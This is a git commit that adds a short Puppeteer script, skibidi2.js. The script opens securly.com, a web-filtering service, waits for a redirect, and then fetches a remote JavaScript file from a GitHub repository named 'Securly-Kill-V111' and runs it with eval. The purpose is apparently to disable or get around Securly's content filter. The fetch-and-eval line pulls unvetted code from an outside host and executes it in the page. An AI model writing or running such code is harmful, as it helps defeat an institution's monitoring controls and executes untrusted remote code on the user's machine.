86ddd403fa48429ebd2f99e9b34fb89511a1aa38
UnicycleParrot <119969668+UnicycleParrot@users.noreply.github.com>
2025-01-09 20:17:14 -0800

    Create skibidi2.js

---
+++ skibidi2.js
@@ -0,0 +1,24 @@
+const puppeteer = require('puppeteer');
+
+(async () => {
+    const browser = await puppeteer.launch({ headless: false });
+    const page = await browser.newPage();
+
+    // Navigate to the initial website
+    await page.goto('https://securly.com');
+
+    // Wait for the redirection to complete
+    await page.waitForNavigation();
+
+    // Execute a script on the redirected website
+    const result = await page.evaluate(() => {
+
+        fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r)) // made by zek-c
+        // Your custom script here
+     //   return document.title; // Example: Get the title of the page
+    });
+
+    console.log('Page Title:', result);
+
+    await browser.close();
+})();
